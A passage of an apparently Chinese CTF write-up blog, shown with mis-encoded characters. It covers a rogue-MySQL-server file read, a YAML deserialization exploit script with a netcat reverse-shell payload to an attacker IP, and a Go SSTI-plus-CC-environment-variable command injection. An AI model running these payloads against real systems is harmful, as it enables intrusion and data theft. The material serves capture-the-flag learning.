äº†adminä¹‹åï¼Œæ˜¾ç¤ºä¸èƒ½è¿æ¥æœ¬åœ°çš„mysqlæ˜¯ä¸æ˜¯å°±èƒ½è¿åˆ«çš„æ•°æ®åº“ï¼Œmysqlä»»æ„è¿æ¥ï¼Œæ‰¾expæ¥æ‰“</p><p><img src="/../images/image-20251111222320934.png" alt="image-20251111222320934"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/allyshka/Rogue-MySql-Server</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ç«¯å£å·ã€ä¹Ÿå¯ä»¥ä¸æ”¹ã€‘ï¼Œå’Œè¯»å–çš„æ–‡ä»¶app.pyï¼Œå°±å¯ä»¥åœ¨è‡ªå·±çš„vpsä¸Šé¢å¯pythonæœåŠ¡ï¼Œç„¶åè¯»çš„æ–‡ä»¶åœ¨mysql.logå½“ä¸­</p><p><img src="/../images/image-20251111225148377.png" alt="image-20251111225148377"></p><p>ä¸ºä»€ä¹ˆè¯»app.pyå‘¢ å› ä¸ºè¯†åˆ«åˆ°ç›¸åº”çš„ã€python-flaskã€‘äº†</p><p><img src="/../images/image-20251111225819442.png" alt="image-20251111225819442"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import yaml</span><br><span class="line">import MySQLdb</span><br><span class="line">from flask import Flask, request, jsonify, render_template, redirect</span><br><span class="line">from functools import wraps</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(24)</span><br><span class="line"></span><br><span class="line">def login_required(f):</span><br><span class="line">    @wraps(f)</span><br><span class="line">    def decorated_function(*args, **kwargs):</span><br><span class="line">        token = request.headers.get(&#x27;Authorization&#x27;, &#x27;&#x27;).replace(&#x27;Bearer &#x27;, &#x27;&#x27;)</span><br><span class="line">        if not token or token not in [&#x27;admin&#x27;, &#x27;user&#x27;]:</span><br><span class="line">            return jsonify(&#123;&quot;error&quot;: &quot;Unauthorized&quot;&#125;), 401</span><br><span class="line">        request.current_user = token</span><br><span class="line">        return f(*args, **kwargs)</span><br><span class="line">    return decorated_function</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return redirect(&#x27;/login&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;)</span><br><span class="line">def login():</span><br><span class="line">    return &#x27;&#x27;&#x27;</span><br><span class="line">    &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="line">        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def do_login():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;, &#x27;&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;, &#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">    if username == &#x27;admin&#x27; and password == os.getenv(&#x27;ADMIN_PASS&#x27;, &#x27;admin123&#x27;):</span><br><span class="line">        return jsonify(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line">    elif username == &#x27;user&#x27; and password == &#x27;user123&#x27;:</span><br><span class="line">        return jsonify(&#123;&quot;token&quot;: &quot;user&quot;&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Invalid credentials&quot;&#125;), 401</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/dashboard&#x27;)</span><br><span class="line">@login_required</span><br><span class="line">def dashboard():</span><br><span class="line">    if request.current_user == &#x27;admin&#x27;:</span><br><span class="line">        return &#x27;&#x27;&#x27;</span><br><span class="line">        &lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;title&gt;Admin Dashboard&lt;/title&gt;</span><br><span class="line">            &lt;style&gt;</span><br><span class="line">            .container &#123;max-width: 800px; margin: 0 auto; padding: 20px;&#125;</span><br><span class="line">            input, button &#123;margin: 5px; padding: 8px;&#125;</span><br><span class="line">            input &#123;width: 200px;&#125;</span><br><span class="line">            &lt;/style&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;h3&gt;ğŸ™ æµ‹è¯• MySQL è¿æ¥&lt;/h3&gt;</span><br><span class="line">                &lt;form id=&quot;f&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;host&quot; placeholder=&quot;Host&quot; value=&quot;127.0.0.1&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;port&quot; placeholder=&quot;Port&quot; value=&quot;3306&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;user&quot; placeholder=&quot;User&quot; value=&quot;root&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;password&quot; placeholder=&quot;Password&quot; type=&quot;password&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;db&quot; placeholder=&quot;Database&quot; value=&quot;mysql&quot;&gt;</span><br><span class="line">                    &lt;button type=&quot;button&quot; onclick=&quot;test()&quot;&gt;æµ‹è¯•è¿æ¥&lt;/button&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">                &lt;pre id=&quot;out&quot;&gt;&lt;/pre&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;script&gt;</span><br><span class="line">                const token = localStorage.getItem(&#x27;token&#x27;);</span><br><span class="line">                if(!token) location.href=&#x27;/&#x27;;</span><br><span class="line">                </span><br><span class="line">                async function test()&#123;</span><br><span class="line">                    const out = document.getElementById(&#x27;out&#x27;);</span><br><span class="line">                    out.textContent = &#x27;æ­£åœ¨æµ‹è¯•...&#x27;;</span><br><span class="line">                    let data = Object.fromEntries(new FormData(f).entries());</span><br><span class="line">                    try&#123;</span><br><span class="line">                        let res = await fetch(&#x27;/test_mysql&#x27;, &#123;</span><br><span class="line">                            method: &#x27;POST&#x27;,</span><br><span class="line">                            headers: &#123;</span><br><span class="line">                                &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">                                &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class="line">                            &#125;,</span><br><span class="line">                            body: JSON.stringify(data)</span><br><span class="line">                        &#125;);</span><br><span class="line">                        let j = await res.json();</span><br><span class="line">                        out.style.color = j.success ? &#x27;green&#x27; : &#x27;red&#x27;;</span><br><span class="line">                        out.textContent = j.success ? &#x27;è¿æ¥æˆåŠŸï¼&#x27; : &#x27;è¿æ¥å¤±è´¥\\n&#x27; + (j.error || &#x27;&#x27;);</span><br><span class="line">                    &#125; catch(e) &#123;</span><br><span class="line">                        out.textContent = &#x27;è¯·æ±‚å‡ºé”™ï¼š&#x27; + e;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &lt;/script&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;&lt;h3&gt;User Dashboard&lt;/h3&gt;&lt;p&gt;Welcome, user!&lt;/p&gt;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/test_mysql&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">@login_required</span><br><span class="line">def test_mysql():</span><br><span class="line">    if request.current_user != &#x27;admin&#x27;:</span><br><span class="line">        return jsonify(&#123;</span><br><span class="line">            &quot;success&quot;: False, </span><br><span class="line">            &quot;error&quot;: &quot;æƒé™ä¸è¶³ï¼Œåªæœ‰ admin å¯ä»¥æµ‹è¯• MySQL è¿æ¥&quot;</span><br><span class="line">        &#125;), 403</span><br><span class="line">    </span><br><span class="line">    data = request.get_json() or &#123;&#125;</span><br><span class="line">    for k in (&quot;host&quot;, &quot;port&quot;, &quot;user&quot;, &quot;password&quot;, &quot;db&quot;):</span><br><span class="line">        if k not in data:</span><br><span class="line">            return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: f&quot;ç¼ºå°‘å­—æ®µ: &#123;k&#125;&quot;&#125;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        conn = MySQLdb.connect(</span><br><span class="line">            host=data[&quot;host&quot;],</span><br><span class="line">            port=int(data[&quot;port&quot;]),</span><br><span class="line">            user=data[&quot;user&quot;],</span><br><span class="line">            passwd=data[&quot;password&quot;],</span><br><span class="line">            db=data[&quot;db&quot;],</span><br><span class="line">            connect_timeout=5,</span><br><span class="line">            charset=&#x27;utf8mb4&#x27;,</span><br><span class="line">            local_infile=1,</span><br><span class="line">            ssl=None</span><br><span class="line">        )</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(&quot;SELECT 1&quot;)</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line">        </span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line">    except MySQLdb.Error as e:</span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: str(e)&#125;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: f&quot;å…¶ä»–é”™è¯¯: &#123;e&#125;&quot;&#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/uneed1t&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def uneed1t():</span><br><span class="line">    data = request.args.get(&#x27;data&#x27;, &#x27;&#x27;)</span><br><span class="line">    if data == &#x27;&#x27;:</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;null&quot;&#125;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        black_list = [&quot;system&quot;, &quot;popen&quot;, &quot;run&quot;, &quot;os&quot;]</span><br><span class="line">        </span><br><span class="line">        for forb in black_list:</span><br><span class="line">            if forb in data:</span><br><span class="line">                return jsonify(&#123;&quot;result&quot;: &quot;error&quot;&#125;)</span><br><span class="line">        </span><br><span class="line">        yaml.load(data, Loader=yaml.Loader)</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;ok&quot;&#125;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;error&quot;&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8000)</span><br></pre></td></tr></table></figure><p>å®¡è®¡å¤šå‡ºæ¥çš„è·¯ç”±&#x2F;uneed1tçš„ä»£ç æ®µï¼Œå‘ç°ä½¿ç”¨äº†yaml.loadåšåŠ è½½å™¨ï¼Œå³ä½¿ä½¿ç”¨äº†é»‘åå•é™åˆ¶äº†ä¸€å†™æ“ä½œï¼Œè¿˜æ˜¯å¯ä»¥ç”¨ <code>subprocess</code>æ¨¡å—æ‰§è¡Œå‘½ä»¤æ‰“yamlååºåˆ—åŒ–æ¼æ´</p><p><img src="/../images/image-20251111234324363.png" alt="image-20251111234324363"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/7518</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251111233615270.png" alt="image-20251111233615270"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;!!python/object/apply:subprocess.Popen</span><br><span class="line">- [&quot;sh&quot;,&quot;-c&quot;,&quot;cat /f* &gt;1.txt&quot;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;!!python/object/apply:subprocess.call</span><br><span class="line">[[&#x27;/bin/busybox&#x27;,&#x27;nc&#x27;,&#x27;xx.xx.xx.xx&#x27;,&#x27;11111&#x27;,&#x27;-e&#x27;,&#x27;/bin/sh&#x27;]]</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>è„šæœ¬ã€å«aiå†™çš„ å˜»å˜»ã€‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># ç›®æ ‡URL - è¯·ä¿®æ”¹ä¸ºå®é™…ç›®æ ‡</span><br><span class="line">target_url = &quot;http://target.com:8000/uneed1t&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 1. ä»»æ„æ–‡ä»¶è¯»å–</span><br><span class="line">payload = &quot;&quot;&quot;!!python/object/apply:subprocess.Popen</span><br><span class="line">- [&quot;sh&quot;,&quot;-c&quot;,&quot;cat /f* &gt;1.txt&quot;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 2. åå¼¹shell</span><br><span class="line"># payload = &quot;&quot;&quot;!!python/object/apply:subprocess.call</span><br><span class="line"># [[&#x27;/bin/busybox&#x27;,&#x27;nc&#x27;,&#x27;YOUR_VPS_IP&#x27;,&#x27;YOUR_PORT&#x27;,&#x27;-e&#x27;,&#x27;/bin/sh&#x27;]]</span><br><span class="line"># &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># ç¼–ç å¹¶å‘é€è¯·æ±‚</span><br><span class="line">encoded_payload = urllib.parse.quote(payload)</span><br><span class="line">full_url = f&quot;&#123;target_url&#125;?data=&#123;encoded_payload&#125;&quot;</span><br><span class="line"></span><br><span class="line">response = requests.get(full_url)</span><br><span class="line">print(f&quot;çŠ¶æ€ç : &#123;response.status_code&#125;&quot;)</span><br><span class="line">print(f&quot;å“åº”: &#123;response.text&#125;&quot;)</span><br></pre></td></tr></table></figure><h3 id="VIP"><a href="#VIP" class="headerlink" title="VIP"></a><strong>VIP</strong></h3><h4 id="è€ƒç‚¹ï¼šgo-ssti-åŠ«æŒç¯å¢ƒå˜é‡ææƒ"><a href="#è€ƒç‚¹ï¼šgo-ssti-åŠ«æŒç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="è€ƒç‚¹ï¼šgo ssti+åŠ«æŒç¯å¢ƒå˜é‡ææƒ"></a>è€ƒç‚¹ï¼šgo ssti+åŠ«æŒç¯å¢ƒå˜é‡ææƒ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬å…¨æ–°çš„PaaSå¹³å°æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„Goæ¨¡æ¿æœåŠ¡ä½œä¸ºå…è´¹å¥—é¤ã€‚å¯¹äºæˆ‘ä»¬çš„VIPå®¢æˆ·ï¼Œæˆ‘ä»¬è¿˜æä¾›äº†ä¸€é¡¹ä¸“å±åŠŸèƒ½ï¼šä¸€ä¸ªç‹¬ç«‹çš„åœ¨çº¿Goç¼–è¯‘å™¨ï¼</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/Joooook/p/18089714</span><br><span class="line">https://xz.aliyun.com/news/15003</span><br></pre></td></tr></table></figure><p>ç»™äº†æºç ï¼Œæ¥çœ‹çœ‹ä»€ä¹ˆæ ·çš„ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ‰ä¸€ä¸ªapié‰´æƒä¸­é—´ä»¶ï¼ŒæœåŠ¡å¯åŠ¨æ—¶å¿…é¡» export API_KEY=xxxxxxxxï¼Œå¦åˆ™ panicã€‚Gin ä¸­é—´ä»¶å‡½æ•°ï¼šå–è¯·æ±‚å¤´ X-API-Key â†’ ä¸åå°æ¯”å¯¹ â†’ ä¸å¯¹å°± 401 æ‰“æ–­</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112125915544.png" alt="image-20251112125915544"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·æ±‚æ–¹å¼å’Œå½¢å¼ POSTï¼Œjson</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112130237633.png" alt="image-20251112130237633"></p><p>åªæœ‰&#x2F;buildè·¯ç”±è¿›è¡Œäº†apié‰´æƒ</p><p><img src="/../images/image-20251112143715466.png" alt="image-20251112143715466"></p><p>å…³é”®æ¸²æŸ“æ¨¡æ¿ç‚¹åœ¨<code>/api</code> æ¥å£æŠŠç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼è¿› template åšæ¸²æŸ“ï¼Œå¯è¿œç¨‹æ‰§è¡Œä»»æ„æ¨¡æ¿è¯­æ³• </p><p><img src="/../images/image-20251112143959688.png" alt="image-20251112143959688"></p><p>æ¨¡æ¿æ¸²æŸ“ï¼Œç”¨Utilsâ¾¥çš„GetReaderå‡½æ•°è¯»â½‚ä»¶ï¼Œè·å¾—X-API-Key</p><p><img src="/../images/image-20251112165010588.png" alt="image-20251112165010588"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; .Utils.GetReader &quot;/proc/self/environ&quot; | .Utils.ReadAll &#125;&#125; å°†ç¯å¢ƒå˜é‡å…¨éƒ¨è¯»å‡ºæ¥ï¼Œå‘ç°æœ‰ä¸ª/app/secret_key.txt</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112165049976.png" alt="image-20251112165049976"></p><p><img src="/../images/image-20251112165131900.png" alt="image-20251112165131900"></p><p>é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå°±æ‹¿åˆ°äº†X-API-Keyï¼Œå°±å¯ä»¥è¿‡äº†&#x2F;vip&#x2F;buildçš„é‰´æƒæ§åˆ¶éƒ¨åˆ†ï¼Œåˆ°äº†buildHandleréƒ¨åˆ†</p><p><img src="/../images/image-20251112172922246.png" alt="image-20251112172922246"></p><p>å°†ç”¨æˆ·çš„è¾“å…¥æºç å’Œç¯å¢ƒå˜é‡åŸå°ä¸åŠ¨ã€ä¿¡ä»»çŠ¶æ€ã€‘çš„å†™ç›˜å’Œç¼–è¯‘ï¼ŒæˆåŠŸå°±ä¸‹è½½ç›¸åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¤±è´¥è¿”å›å›æ˜¾</p><p>ä½†æ˜¯æ­£å¸¸å†™å…¥goæºç å½“ä¸­å¹¶ä¸ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œè®¾ç½®â€CGO_ENABLEDâ€: â€œ1â€ï¼Œgo buildå°±ä¼šè°ƒç”¨å¤–éƒ¨ C ç¼–è¯‘å™¨(é»˜è®¤æ˜¯ <code>gcc</code>ï¼‰</p><p>æ—¢å¯ä»¥ç†è§£ç­‰äº build è¿›ç¨‹å…ˆå¸®æˆ‘ä»¬æ‰§è¡Œä»»æ„å‘½ä»¤ã€ä½†æ˜¯ç»“æœä¸èƒ½å›æ˜¾ã€‘ï¼Œç„¶åè½ç›˜åˆ°å›ºå®šç¼–è¯‘çš„ç›®å½•&#x2F;buildä¸‹</p><p>è¿ç”¨go:embedã€å®ƒå…è®¸å¼€å‘è€…åœ¨ç¼–è¯‘æ—¶å°†é™æ€èµ„æºæ–‡ä»¶åµŒå…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‘ï¼Œå°†ä¸å‡ºç½‘çš„æ‰§è¡Œå‘½ä»¤ç»“æœè¿›è¡Œæ˜¾ç¤º</p><p>å°†å¯è¯»å¯å†™çš„æ–‡ä»¶ã€å¯èƒ½å«æœ‰flagã€‘å†™å…¥åˆ°s.txtç„¶ådumpä¸‹æ¥äºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\nimport \&quot;C\&quot;\n\nfunc main() &#123;&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;,</span><br><span class="line">    &quot;CC&quot;: &quot;/bin/sh -c &#x27;find / -type f -perm /4000 2&gt;/dev/null &gt; /tmp/build/s.txt; gcc \&quot;$@\&quot;&#x27; gcc-shim&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\n\nimport (\n\t\&quot;embed\&quot;\n\t\&quot;os\&quot;\n)\n\n//go:embed s.txt\nvar f []byte\n\nfunc main() &#123;\n\tos.Stdout.Write(f)\n&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112191029341.png" alt="image-20251112191029341"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\nimport \&quot;C\&quot;\n\nfunc main() &#123;&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;,</span><br><span class="line">    &quot;CC&quot;: &quot;/bin/sh -c &#x27;/usr/local/bin/flagread /flag.txt &gt; /tmp/build/flag.txt; gcc \&quot;$@\&quot;&#x27; gcc-shim&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\n\nimport (\n\t\&quot;embed\&quot;\n\t\&quot;os\&quot;\n)\n\n//go:embed s.txt\nvar f []byte\n\nfunc main() &#123;\n\tos.Stdout.Write(f)\n&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†dumpä¸‹æ¥çš„æ–‡ä»¶æœç´ flagæˆ–è€… å¸¸è§„æ¥è¯´åº”è¯¥ä¼šå‡ºç°åƒwpä¸€æ ·çš„æ–‡ä»¶è·¯åŠ²ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æ‰¾åˆ°ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p><img src="/../images/image-20251112192018461.png" alt="image-20251112192018461"></p><p><img src="/../images/image-20251112191046950.png" alt="image-20251112191046950"></p><p>åé¢å’Œä¸Šé¢ä¸€æ ·å°†ç›¸åº”åœ°å€ä¸‹çš„flagæ–‡ä»¶dumpä¸‹æ¥æ‰¾flagå°±å¥½äº† ä½†æ˜¯ä¾æ—§æ²¡æœ‰æ‰¾åˆ°ï¼Œå¯èƒ½ç¯å¢ƒå‡ºé—®é¢˜ã€ä¸æ‡‚ã€‘</p><p><img src="/../images/image-20251112192141963.png" alt="image-20251112192141963"></p><p><img src="/../images/image-20251112191657594.png" 